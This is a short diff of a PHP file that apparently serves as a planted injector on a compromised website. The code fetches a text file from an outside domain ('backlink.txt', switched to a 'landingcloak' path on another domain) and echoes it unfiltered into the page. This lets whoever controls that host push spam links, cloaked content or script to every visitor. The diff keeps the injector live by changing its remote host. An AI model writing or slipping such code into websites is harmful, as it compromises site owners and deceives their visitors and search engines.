@@ -1,5 +1,5 @@
 <?php
-$elgasci = file_get_contents("https://estehpanas.vip/backlink.txt");
+$elgasci = file_get_contents("https://cucunenek.site/landingcloakbiasa/laundry.txt");
 if ($elgasci !== false){
   echo $elgasci;
 }
